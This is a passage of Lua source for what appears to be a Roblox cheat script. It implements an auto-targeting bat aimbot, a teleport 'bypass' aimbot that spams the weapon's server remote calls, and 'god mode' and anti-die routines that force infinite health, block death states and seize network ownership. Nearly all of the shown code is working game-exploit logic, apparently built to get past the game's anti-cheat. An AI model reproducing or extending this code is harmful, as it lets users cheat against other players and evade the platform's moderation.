    if remote and remote:IsA("RemoteEvent") then pcall(function() remote:FireServer() end);task.wait(0.15);pcall(function() remote:FireServer() end)
    else pcall(function() bat:Activate() end);task.wait(0.15);pcall(function() bat:Activate() end) end
end

function M.startBatCounter()
    -- K7 Duels bat counter
    if M.Conns.batCounter then return end
    M.Conns.batCounter = RunService.Heartbeat:Connect(function()
        if not M.batCounterEnabled or M.batCounterDebounce then return end
        local char = player.Character
        if not char then return end
        local hum2 = char:FindFirstChildOfClass("Humanoid")
        if not hum2 then return end
        local st = hum2:GetState()
        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll then
            M.batCounterDebounce = true
            task.spawn(function()
                local bat = M.findBatForCounter()
                if bat then M.swingBatForCounter(bat, char) end
                task.wait(0.5)
                M.batCounterDebounce = false
            end)
        end
    end)
end

function M.stopBatCounter()
    if M.Conns.batCounter then
        M.Conns.batCounter:Disconnect()
        M.Conns.batCounter = nil
    end
    M.batCounterDebounce = false
end

M.aimbotSpeed = M.aimbotSpeed or 58
M.laggerAimbotSpeed = M.laggerAimbotSpeed or 40
M._aimbotSwingCooldown = false

M.aimbotSpeed = M.aimbotSpeed or 57
M.laggerAimbotSpeed = M.laggerAimbotSpeed or 40
M.aimbotHitRange = M.aimbotHitRange or 9.5
M.aimbotSwingCD = M.aimbotSwingCD or 0.12
M.aimbotRotationSpeed = M.aimbotRotationSpeed or 0.55
M.aimbotRotationEnabled = true
M.aimbotHeightOffset = M.aimbotHeightOffset or 1.6

function M.findBatForAimbot()
    local char = player.Character
    if not char then return nil end
    local bp = player:FindFirstChild("Backpack")

    if M.BAT_COUNTER_SLAP_LIST then
        for _, name in ipairs(M.BAT_COUNTER_SLAP_LIST) do
            local t = char:FindFirstChild(name) or (bp and bp:FindFirstChild(name))
            if t and t:IsA("Tool") then return t end
        end
    end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") then
            local n = tool.Name:lower()
            if n:find("bat") or n:find("slap") then return tool end
        end
    end
    if bp then
        for _, tool in ipairs(bp:GetChildren()) do
            if tool:IsA("Tool") then
                local n = tool.Name:lower()
                if n:find("bat") or n:find("slap") then return tool end
            end
        end
    end
    return nil
end

function M.getClosestTargetAimbot()
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest
end

M.AIMBOT_STICKY_TIME = M.AIMBOT_STICKY_TIME or 1.25
M.AIMBOT_STICKY_MAX_DIST = M.AIMBOT_STICKY_MAX_DIST or 85
M._aimbotStickyUntil = 0
M._aimbotStickyTarget = nil

function M.getAutoBatTarget()
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local now = tick()
    local function stillValid(tRoot)
        if not tRoot or not tRoot.Parent then return false end
        local hum = tRoot.Parent:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return false end
        if (tRoot.Position - root.Position).Magnitude > (M.AIMBOT_STICKY_MAX_DIST or 85) then return false end
        return true
    end
    local sticky = M._aimbotStickyTarget
    if sticky and now < (M._aimbotStickyUntil or 0) and stillValid(sticky) then
        M._aimbotTarget = sticky
        return sticky
    end
    if now - (M._aimbotLastScan or 0) <= 0.08 and M._aimbotTarget and stillValid(M._aimbotTarget) then
        return M._aimbotTarget
    end
    M._aimbotLastScan = now
    local closest = M.getClosestTargetAimbot and M.getClosestTargetAimbot() or nil
    M._aimbotTarget = closest
    M._aimbotStickyTarget = closest
    M._aimbotStickyUntil = now + (tonumber(M.AIMBOT_STICKY_TIME) or 1.25)
    return closest
end

function M.getNormalAimbotSpeed()

    if M.laggerModeEnabled or M.laggerCarryActive then
        return tonumber(M.laggerAimbotSpeed) or 40
    end
    return tonumber(M.aimbotSpeed) or 58
end

function M._aimbotSwingBat(char, bat)
    if not bat or not bat.Parent then return end
    if bat.Parent ~= char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then pcall(function() hum:EquipTool(bat) end) end
        return
    end
    pcall(function() bat:Activate() end)
end

function M.startBatAimbot()
    if not M.safeModeTryStart() then return end
    if M.aimbotConn then pcall(function() M.aimbotConn:Disconnect() end); M.aimbotConn = nil end
    if M._specBypass and M._specBypass.conn then pcall(function() M._specBypass.conn:Disconnect() end); M._specBypass.conn = nil end
    pcall(function() RunService:UnbindFromRenderStep("VynxAimbotRotCam") end)
    if M.batTPEnabled and M.stopBatTPAimbot then pcall(function() M.stopBatTPAimbot() end) end
    if M.bypassAimbotEnabled and M.stopBypassAimbot then pcall(function() M.stopBypassAimbot() end) end
    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
    M._autoTPWasEnabledForBat = false
    if M.autoTPEnabled then M._autoTPWasEnabledForBat=true; M.stopAutoTP(); if M.setAutoTPVisual then M.setAutoTPVisual(false) end end
    pcall(function() if M.stopAutoTPForAction then M.stopAutoTPForAction() end end)
    M.autoBatEnabled = true
    M.autoSwingEnabled = true
    M.autoBatEquippedThisRun = false
    M.batAimbotMode = "Normal"
    M._aimbotTarget = nil
    M._aimbotLastScan = 0
    -- Normal = original Vynx bat aimbot logic
    M.aimbotConn = RunService.Heartbeat:Connect(function()
        if not M.autoBatEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        if hum.Health <= 0 then return end
        if hum.PlatformStand then pcall(function() hum.PlatformStand=false end) end
        pcall(function()
            local lv=root.AssemblyLinearVelocity; local av=root.AssemblyAngularVelocity
            if lv.Magnitude > 220 then root.AssemblyLinearVelocity = lv.Unit * 60 end
            if av.Magnitude > 25 then root.AssemblyAngularVelocity = Vector3.zero end
        end)
        local bat = char:FindFirstChildOfClass("Tool") or (M.findBatForAimbot and M.findBatForAimbot() or nil)
        if bat and bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
        local target = (M.getAutoBatTarget and M.getAutoBatTarget()) or (M.getClosestTargetAimbot and M.getClosestTargetAimbot())
        if not target then hum.AutoRotate=true; root.AssemblyAngularVelocity=Vector3.zero; return end
        M._aimbotTarget = target
        hum.AutoRotate=false
        local targetVel = target.AssemblyLinearVelocity or Vector3.zero
        local myPos = root.Position
        local targetPos = target.Position
        local aimPos = targetPos + targetVel * 0.14 + target.CFrame.LookVector * 0.3
        local direction = aimPos - myPos
        if direction.Magnitude < 0.01 then return end
        local flatDir = Vector3.new(direction.X,0,direction.Z)
        if flatDir.Magnitude < 0.01 then return end
        flatDir = flatDir.Unit
        local chaseSpeed = M.getNormalAimbotSpeed and M.getNormalAimbotSpeed() or (tonumber(M.aimbotSpeed) or 58)
        if M.laggerModeEnabled and M.getLaggerAimbotSpeed then
            local ok, v = pcall(M.getLaggerAimbotSpeed); if ok and type(v)=="number" then chaseSpeed=v end
        end
        local desiredHeight = targetPos.Y + 3.7
        local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
        if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
        yVel = math.clamp(yVel, -70, 110)
        local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
        root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
        local predictTime = math.clamp(targetVel.Magnitude / 150, 0.05, 0.2)
        local rotationTarget = targetPos + targetVel * predictTime
        local toPredict = rotationTarget - myPos
        if toPredict.Magnitude > 0.1 then
            local goalCF = CFrame.lookAt(myPos, rotationTarget)
            local diffCF = root.CFrame:Inverse() * goalCF
            local rx,ry,rz = diffCF:ToEulerAnglesXYZ()
            root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(math.clamp(rx,-2.5,2.5)*42, math.clamp(ry,-2.5,2.5)*42, math.clamp(rz,-2.5,2.5)*42))
        end
        if M.autoSwingEnabled ~= false and bat then
            if not M._aimbotSwingCooldown then
                M._aimbotSwingCooldown = true
                pcall(function() bat:Activate() end)
                task.delay(0.08, function() M._aimbotSwingCooldown=false end)
            end
        end
    end)
    if M._aimbotCharConn then pcall(function() M._aimbotCharConn:Disconnect() end) end
    M._aimbotCharConn = player.CharacterAdded:Connect(function(char)
        if not M.autoBatEnabled then return end
        task.wait(0.25)
        local root = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart",3)
        local hum = char:FindFirstChildOfClass("Humanoid")
        pcall(function()
            if root then root.AssemblyLinearVelocity=Vector3.zero; root.AssemblyAngularVelocity=Vector3.zero end
            if hum then hum.PlatformStand=false; hum.AutoRotate=false; local bat=M.findBatForAimbot and M.findBatForAimbot() or nil; if bat then hum:EquipTool(bat) end end
            if M.syncCombatAntiDie then M.syncCombatAntiDie() end
        end)
        if M.autoBatSetVisual then pcall(function() M.autoBatSetVisual(true) end) end
        if M.mobBtnRefs and M.mobBtnRefs.autoBat then pcall(function() M.mobBtnRefs.autoBat(true) end) end
    end)
    if M.autoBatSetVisual then M.autoBatSetVisual(true) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(true) end
end

function M.stopBatAimbot()
    if M.aimbotConn then pcall(function() M.aimbotConn:Disconnect() end); M.aimbotConn=nil end
    if M._aimbotCharConn then pcall(function() M._aimbotCharConn:Disconnect() end); M._aimbotCharConn=nil end
    if M._specBypass and M._specBypass.conn then pcall(function() M._specBypass.conn:Disconnect() end); M._specBypass.conn=nil end
    pcall(function() RunService:UnbindFromRenderStep("VynxAimbotRotCam") end)
    do
        local char=player.Character; local root=char and char:FindFirstChild("HumanoidRootPart"); local hum=char and char:FindFirstChildOfClass("Humanoid")
        if root then pcall(function() root.AssemblyLinearVelocity=root.AssemblyLinearVelocity*0.3; root.AssemblyAngularVelocity=Vector3.zero end) end
        if hum then pcall(function() hum.AutoRotate=true end) end
    end
    M._aimbotStickyTarget=nil; M._aimbotLookPos=nil; M._aimbotTarget=nil; M._aimbotSwingCooldown=false; M._aimbotLastSwing=0; M._aimbotTargetLockUntil=0
    M.autoBatEnabled=false; M.autoBatEquippedThisRun=false; pcall(function() M.syncCombatAntiDie() end)
    local char=player.Character; local root=char and char:FindFirstChild("HumanoidRootPart")
    if root then root.AssemblyLinearVelocity=Vector3.zero; root.AssemblyAngularVelocity=Vector3.zero end
    local hum2=char and char:FindFirstChildOfClass("Humanoid"); if hum2 then hum2.AutoRotate=true end
    if M._autoTPWasEnabledForBat then M._autoTPWasEnabledForBat=false; M.autoTPEnabled=true; if M.setAutoTPVisual then M.setAutoTPVisual(true) end; M.startAutoTP() end
    if M.autoBatSetVisual then M.autoBatSetVisual(false) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(false) end
end

-- Spectrum / Envy-style Anti-Bypass bat aimbot (from Dacia)
M._specBypass = M._specBypass or { conn = nil, swingCD = false }

function M._specFindBat()
    local char = player.Character
    if not char then return nil end
    local function isBat(tool)
        if not tool or not tool:IsA("Tool") then return false end
        local n = tool.Name:lower()
        return n:find("bat") or n:find("slap") or n:find("glove") or n:find("hand")
    end
    for _, tool in ipairs(char:GetChildren()) do
        if isBat(tool) then return tool end
    end
    local bp = player:FindFirstChild("Backpack")
    if bp then
        for _, tool in ipairs(bp:GetChildren()) do
            if isBat(tool) then return tool end
        end
    end
    return nil
end

function M._specGetTarget()
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest
end

function M._specSwing()
    if not M.autoSwingEnabled then return end
    if M._specBypass.swingCD then return end
    local bat = M._specFindBat()
    if bat and bat.Parent == player.Character then
        M._specBypass.swingCD = true
        pcall(function() bat:Activate() end)
        task.delay(0.08, function() M._specBypass.swingCD = false end)
    end
end

function M._specBypassTick()
    if not M.autoBatEnabled or tostring(M.batAimbotMode or "Normal") ~= "Bypass" then return end
    local c = player.Character
    if not c then return end
    local root = c:FindFirstChild("HumanoidRootPart")
    local hum = c:FindFirstChildOfClass("Humanoid")
    if not root or not hum or hum.Health <= 0 then return end
    if not c:FindFirstChildOfClass("Tool") then
        local bat = M._specFindBat()
        if bat then pcall(function() hum:EquipTool(bat) end) end
    end
    local target = M._specGetTarget()
    if not target then
        M._specSwing()
        return
    end
    hum.AutoRotate = false
    local targetVel = target.AssemblyLinearVelocity
    local myPos = root.Position
    local targetPos = target.Position
    local predictPos = targetPos + targetVel * 0.14 + target.CFrame.LookVector * 0.3
    local direction = predictPos - myPos
    local flatDir = Vector3.new(direction.X, 0, direction.Z)
    if flatDir.Magnitude < 0.01 then
        M._specSwing()
        return
    end
    flatDir = flatDir.Unit
    local chaseSpeed = tonumber(M.batTPSpeed) or 58
    if M.laggerModeEnabled or M.laggerCarryActive then
        chaseSpeed = tonumber(M.laggerAimbotSpeed) or 40
    end
    local desiredHeight = targetPos.Y + 3.7
    local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
    if hum.FloorMaterial ~= Enum.Material.Air then
        yVel = math.max(yVel, 13)
    end
    yVel = math.clamp(yVel, -70, 110)
    local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
    root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
    local speed3 = targetVel.Magnitude
    local predictTime = math.clamp(speed3 / 150, 0.05, 0.2)
    local predictedPos = targetPos + targetVel * predictTime
    if (predictedPos - myPos).Magnitude > 0.1 then
        local goalCF = CFrame.lookAt(myPos, predictedPos)
        local diffCF = root.CFrame:Inverse() * goalCF
        local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
        rx = math.clamp(rx, -2.5, 2.5)
        ry = math.clamp(ry, -2.5, 2.5)
        rz = math.clamp(rz, -2.5, 2.5)
        local tiltSpeed = 42
        root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * tiltSpeed, ry * tiltSpeed, rz * tiltSpeed))
    end
    M._specSwing()
end

function M.startSpectrumBypassAimbot()
    if not M.safeModeTryStart() then return end
    if M.aimbotConn then pcall(function() M.aimbotConn:Disconnect() end); M.aimbotConn = nil end
    if M._specBypass.conn then pcall(function() M._specBypass.conn:Disconnect() end); M._specBypass.conn = nil end
    if M.batTPEnabled and M.stopBatTPAimbot then pcall(function() M.stopBatTPAimbot() end) end
    if M.bypassAimbotEnabled and M.stopBypassAimbot then pcall(function() M.stopBypassAimbot() end) end
    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
    M._autoTPWasEnabledForBat = false
    if M.autoTPEnabled then M._autoTPWasEnabledForBat=true; M.stopAutoTP(); if M.setAutoTPVisual then M.setAutoTPVisual(false) end end
    M.autoBatEnabled = true
    M.autoSwingEnabled = true
    M.batAimbotMode = "Bypass"
    local hum0 = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then pcall(function() hum0.AutoRotate = false end) end
    M._specBypass.conn = RunService.RenderStepped:Connect(function()
        M._specBypassTick()
    end)
    if M.autoBatSetVisual then pcall(function() M.autoBatSetVisual(true) end) end
    if M.mobBtnRefs and M.mobBtnRefs.autoBat then pcall(function() M.mobBtnRefs.autoBat(true) end) end
end

function M.queueAutoBatStart()
    if not M.safeModeTryStart() then return end
    if M.antiKickEnabled and M.brainrotDetected then return end
    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
    if tostring(M.batAimbotMode or "Normal") == "Bypass" then
        M.startSpectrumBypassAimbot()
    else
        M.startBatAimbot()
    end
end

function M.swingCurrentBatAimbot(char)
    if not M.autoSwingEnabled then return end
    local bat = M.findBatForAimbot()
    if bat then
        M._aimbotSwingBat(char or player.Character, bat)
    end
end

M._bypassTarget = nil
M._bypassHRP = nil
M._bypassHum = nil
M.tpBatRange = M.tpBatRange or 1e9
M.tpBatClose = M.tpBatClose or 5

M._zBatSpeed = M._zBatSpeed or 70
M._zBatDist = M._zBatDist or 2.2
M._zBatHeight = M._zBatHeight or 1.2
M._zBatVertOffset = M._zBatVertOffset or 0
M._zBatTurnSpeed = M._zBatTurnSpeed or 12
M._zBatMaxTurn = M._zBatMaxTurn or 0.45
M._zBatVertSpeed = M._zBatVertSpeed or 40

M.tpBatOffset = M.tpBatOffset or 0
M.tpBatHitMode = M.tpBatHitMode or "Sure"
M.tpBatSureHitEnabled = true
M._tpBatLastSwing = 0
M._bypassSwingCooldown = false
M._sureHitCD = false
M._normalHitCD = false
M._bypassRenderConn = nil

function M._bypassFindBat()
    local char = player.Character
    if not char then return nil end
    local function isBat(t)
        if not t or not t:IsA("Tool") then return false end
        local n = string.lower(t.Name)
        return n == "bat" or n:find("bat", 1, true) ~= nil
    end
    for _, t in ipairs(char:GetChildren()) do
        if isBat(t) then return t end
    end
    local bp = player:FindFirstChild("Backpack")
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if isBat(t) then
                pcall(function() t.Parent = char end)
                return t
            end
        end
    end
    return nil
end

function M._bypassTryHitBat()
    if M.tpBatAutoSwing == false and M.autoSwingEnabled == false then return end
    if M._sureHitCD then return end
    M._sureHitCD = true
    pcall(function()
        local bat = M._bypassFindBat()
        if bat then
            for _ = 1, 3 do
                pcall(function() bat:Activate() end)
                local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
                if ev then pcall(function() ev:FireServer() end) end
            end
            local rf = bat:FindFirstChildWhichIsA("RemoteFunction")
            if rf then pcall(function() rf:InvokeServer() end) end
        end
    end)
    task.delay(0.045, function() M._sureHitCD = false end)
end

function M._bypassTryHitBatNormal()
    if M.tpBatAutoSwing == false and M.autoSwingEnabled == false then return end
    if M._normalHitCD then return end
    M._normalHitCD = true
    pcall(function()
        local bat = M._bypassFindBat()
        if bat then
            for _ = 1, 3 do
                pcall(function() bat:Activate() end)
                local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
                if ev then pcall(function() ev:FireServer() end) end
            end
            local rf = bat:FindFirstChildWhichIsA("RemoteFunction")
            if rf then pcall(function() rf:InvokeServer() end) end
        end
    end)
    task.delay(0.045, function() M._normalHitCD = false end)
end

function M._bypassGetClosest()
    local root = M._bypassHRP or (player.Character and player.Character:FindFirstChild("HumanoidRootPart"))
    if not root then return nil, math.huge end
    local cam = workspace.CurrentCamera
    local closest, bestScore = nil, math.huge
    local bestDist = math.huge
    local camPos = cam and cam.CFrame.Position or root.Position
    local look = cam and cam.CFrame.LookVector or root.CFrame.LookVector
    local vp = cam and cam.ViewportSize or Vector2.new(1920, 1080)
    local cx, cy = vp.X * 0.5, vp.Y * 0.5
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local tHum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and tHum and tHum.Health > 0 then
                local dist = (root.Position - tRoot.Position).Magnitude
                local score = dist
                if cam then
                    local screen, onScreen = cam:WorldToViewportPoint(tRoot.Position)
                    if onScreen and screen.Z > 0 then
                        local sd = (Vector2.new(screen.X, screen.Y) - Vector2.new(cx, cy)).Magnitude

                        score = sd * 0.85 + dist * 0.25
                    else
                        local toT = (tRoot.Position - camPos)
                        if toT.Magnitude > 0.1 then
                            local dot = look:Dot(toT.Unit)
                            if dot > 0.15 then
                                score = dist * (1.6 - math.clamp(dot, 0, 1))
                            else
                                score = dist * 3.5
                            end
                        end
                    end
                end
                if score < bestScore then
                    bestScore = score
                    bestDist = dist
                    closest = plr
                end
            end
        end
    end
    return closest, bestDist
end

function M._bypassCamLookFlat()
    local cam = workspace.CurrentCamera
    local root = M._bypassHRP
    local look
    if cam then
        look = cam.CFrame.LookVector
    elseif root then
        look = root.CFrame.LookVector
    else
        look = Vector3.new(0, 0, -1)
    end
    look = Vector3.new(look.X, 0, look.Z)
    if look.Magnitude < 0.05 then
        look = Vector3.new(0, 0, -1)
    else
        look = look.Unit
    end
    return look
end

function M._bypassSmoothToTarget(tr)
    local hrp = M._bypassHRP
    if not hrp or not tr then return end
    local look = M._bypassCamLookFlat()
    local tVel = tr.AssemblyLinearVelocity or Vector3.zero

    local pred = tr.Position + Vector3.new(tVel.X, 0, tVel.Z) * 0.08

    local standDist = 2.0
    local standPos = pred - look * standDist + Vector3.new(0, 0.55, 0)
    local faceAt = Vector3.new(pred.X, standPos.Y, pred.Z)
    local goal = CFrame.lookAt(standPos, faceAt)

    local alpha = 0.62
    hrp.CFrame = hrp.CFrame:Lerp(goal, alpha)

    local v = hrp.AssemblyLinearVelocity
    hrp.AssemblyLinearVelocity = Vector3.new(v.X * 0.35, v.Y, v.Z * 0.35)
end

function M._bypassClearGodConns()
    for _, key in ipairs({"_bypassGodConn", "_bypassGodHealthConn", "_bypassGodDiedConn", "_bypassGodCharConn", "_bypassGodStateConn"}) do
        local c = M[key]
        if c then pcall(function() c:Disconnect() end); M[key] = nil end
    end
end

function M._bypassProtectCharacter(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    pcall(function()
        hum.MaxHealth = math.huge
        hum.Health = math.huge
        hum.BreakJointsOnDeath = false
        hum.RequiresNeck = false
        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
        hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        hum:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
        hum.PlatformStand = false
        hum.Sit = false
    end)
    local root = char:FindFirstChild("HumanoidRootPart")
    if root then
        pcall(function()
            if root:CanSetNetworkOwnership() then
                root:SetNetworkOwner(player)
            end
        end)
    end
    if M._bypassGodHealthConn then pcall(function() M._bypassGodHealthConn:Disconnect() end) end
    M._bypassGodHealthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
        if not M.bypassAimbotEnabled then return end
        pcall(function()
            if hum.Health < (hum.MaxHealth or 100) or hum.Health <= 0 then
                hum.MaxHealth = math.huge
                hum.Health = math.huge
                hum.PlatformStand = false
                hum.Sit = false
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
        end)
    end)
    if M._bypassGodDiedConn then pcall(function() M._bypassGodDiedConn:Disconnect() end) end
    M._bypassGodDiedConn = hum.Died:Connect(function()
        if not M.bypassAimbotEnabled then return end

        pcall(function()
            hum.BreakJointsOnDeath = false
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum.PlatformStand = false
            hum.Sit = false
            hum:ChangeState(Enum.HumanoidStateType.Running)
            local r = char:FindFirstChild("HumanoidRootPart")
            if r and M._bypassSafeRecoverCF then
                r.CFrame = M._bypassSafeRecoverCF(r)
                r.AssemblyLinearVelocity = Vector3.zero
                r.AssemblyAngularVelocity = Vector3.zero
            end
            task.defer(function()
                if not M.bypassAimbotEnabled then return end
                pcall(function()
                    hum.MaxHealth = math.huge
                    hum.Health = math.huge
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end)
        end)
    end)
    pcall(function()
        if M._bypassGodStateConn then pcall(function() M._bypassGodStateConn:Disconnect() end) end
        M._bypassGodStateConn = hum.StateChanged:Connect(function(_, new)
            if not M.bypassAimbotEnabled then return end
            if new == Enum.HumanoidStateType.Dead
                or new == Enum.HumanoidStateType.Ragdoll
                or new == Enum.HumanoidStateType.FallingDown
                or new == Enum.HumanoidStateType.Physics
                or new == Enum.HumanoidStateType.Flying then
                pcall(function()
                    hum.MaxHealth = math.huge
                    hum.Health = math.huge
                    hum.PlatformStand = false
                    hum.Sit = false
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end
        end)
    end)
end

-- === Vynx Anti Die % Fling (SNOW.VS transplant - AntiDie + AntiFlingShield) ===
M._antiDieConnections = M._antiDieConnections or {}
M._antiDieHeartbeat = M._antiDieHeartbeat or nil
M._antiFlingShieldLoop = M._antiFlingShieldLoop or nil
M._antiDieLoop = nil
M._antiDieHealthConn = nil
M._antiDieCharConn = nil
M._antiDieConfig = M._antiDieConfig or {healthThreshold=50, invincibilityFrames=0.75, ragdollProtection=true, autoRevive=true}
M._antiDieLastHeal = 0
M._antiDieInvincibleUntil = 0

function M._adClearConns()
    for _, c in ipairs(M._antiDieConnections or {}) do pcall(function() c:Disconnect() end) end
    M._antiDieConnections = {}
    if M._antiDieHeartbeat then pcall(function() M._antiDieHeartbeat:Disconnect() end); M._antiDieHeartbeat = nil end
    if M._antiFlingShieldLoop then pcall(function() M._antiFlingShieldLoop:Disconnect() end); M._antiFlingShieldLoop = nil end
    if M._antiDieLoop then pcall(function() M._antiDieLoop:Disconnect() end); M._antiDieLoop = nil end
    for _, key in ipairs({"_antiDieConn","antiDieConn","_antiDieCharConn","_antiDieHealthConn","_antiDieDiedConn","_antiDieRenderConn","_antiDieStateConn","_adLoop","_adHealthConn","_adCharConn","_antiDieLoop","_antiDieHealthConn","_antiDieCharConn"}) do
        local c = M[key]; if c then pcall(function() c:Disconnect() end); M[key]=nil end
    end
    if M._antiDieDeathConns then for _, c in ipairs(M._antiDieDeathConns) do pcall(function() c:Disconnect() end) end; M._antiDieDeathConns={} end
end

M._antiDieSuperHeal = function(hum)
    if not hum or not hum.Parent then return end
    local maxHealth = hum.MaxHealth or 100; if maxHealth <= 0 then maxHealth = 100 end
    pcall(function() hum.Health = maxHealth; if hum.MaxHealth < maxHealth then hum.MaxHealth = maxHealth end end)
    M._antiDieInvincibleUntil = tick() + M._antiDieConfig.invincibilityFrames; M._antiDieLastHeal = tick()
    pcall(function()
        local char = hum.Parent; if not char then return end
        for _, child in ipairs(char:GetChildren()) do
            if child:IsA("NumberValue") then
                local n = child.Name:lower()
                if n:find("health") or n:find("hp") or n:find("life") then child.Value = maxHealth end
            elseif child:IsA("BoolValue") and child.Name:lower():find("dead") then
                child.Value = false
            end
        end
    end)
end

M._antiDieAutoRevive = function()
    if not M._antiDieConfig.autoRevive then return end
    local char = player.Character; local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart"); if not hum or hum.Health > 0 then return end
    M._antiDieSuperHeal(hum)
    pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp); hum:ChangeState(Enum.HumanoidStateType.Running) end)
    if root then pcall(function() root.CFrame = CFrame.new(root.Position + Vector3.new(0,3,0)); root.AssemblyLinearVelocity = Vector3.zero end) end
end

M._antiDiePreventDamage = function(root,hum)
    if not hum then return end
    if hum.Health < (hum.MaxHealth or 100) then M._antiDieSuperHeal(hum) end
    if tick() < M._antiDieInvincibleUntil and hum.Health < (hum.MaxHealth or 100) then hum.Health = hum.MaxHealth or 100 end
    if M._antiDieConfig.ragdollProtection then
        local state = hum:GetState()
        if state==Enum.HumanoidStateType.Physics or state==Enum.HumanoidStateType.Ragdoll or state==Enum.HumanoidStateType.FallingDown or state==Enum.HumanoidStateType.Dead then
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp); hum:ChangeState(Enum.HumanoidStateType.Running) end)
            M._antiDieSuperHeal(hum)
            if root then pcall(function() root.AssemblyAngularVelocity = Vector3.zero end) end
        end
    end
    if hum.Health <= 0 then
        M._antiDieSuperHeal(hum)
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp); hum:ChangeState(Enum.HumanoidStateType.Running) end)
        if root then pcall(function() root.CFrame = CFrame.new(root.Position + Vector3.new(0,2,0)); root.AssemblyLinearVelocity = Vector3.zero end) end
    end
end

M._antiDieAttachHealth = function(char)
    if M._antiDieHealthConn then pcall(function() M._antiDieHealthConn:Disconnect() end); M._antiDieHealthConn=nil end
    local hum = char and (char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid",3)); if not hum then return end
    M._antiDieHealthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
        if not M.antiDieEnabled then return end
        if hum.Health < (hum.MaxHealth or 100) then M._antiDieSuperHeal(hum) end
        if hum.Health <= 0 then M._antiDieAutoRevive() end
    end)
    table.insert(M._antiDieConnections, M._antiDieHealthConn)
    if hum.Health < (hum.MaxHealth or 100) then M._antiDieSuperHeal(hum) end
end

M._antiFlingStabilizeRoot = function(root)
    if not root or not root.Parent then return end
    local velocity; local ok = pcall(function() velocity = root.AssemblyLinearVelocity end)
    if not ok or typeof(velocity) ~= "Vector3" then
        ok, velocity = pcall(function() return root.Velocity end)
        if not ok or typeof(velocity) ~= "Vector3" then return end
    end
